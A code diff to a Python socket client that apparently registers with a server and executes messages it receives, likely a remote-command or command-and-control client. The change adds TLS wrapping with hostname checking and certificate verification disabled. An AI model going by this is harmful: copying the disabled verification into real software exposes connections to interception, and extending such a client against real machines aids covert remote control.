@@ -2,7 +2,7 @@ import socket
 import subprocess
 import sys
 import ipaddress
-
+import ssl
 
 # Global Constants
 CLIENT_HOST = "127.0.0.1"
@@ -56,6 +56,9 @@ def create_session(client_host, server_host, port):
     # Create a new TCP Socket object, and connect to the server
 
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    client_socket = make_socket_tls(client_socket, server_host)
+
     try:
         client_socket.connect((server_host, port))
     except:
@@ -68,6 +71,16 @@ def create_session(client_host, server_host, port):
     client_socket.sendall(bytes(registration_request, encoding=ENCODING))
 
     return client_socket
+
+
+def make_socket_tls(client_socket, server_host):
+    # Wrap with SSL context
+    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+    context.check_hostname = False  # because it's self-signed
+    context.verify_mode = ssl.CERT_NONE
+    secure_socket = context.wrap_socket(client_socket, server_hostname=server_host)
+    return secure_socket
+
 
 def execute_message(socket_object, message):
     # Execute a message if it exist.
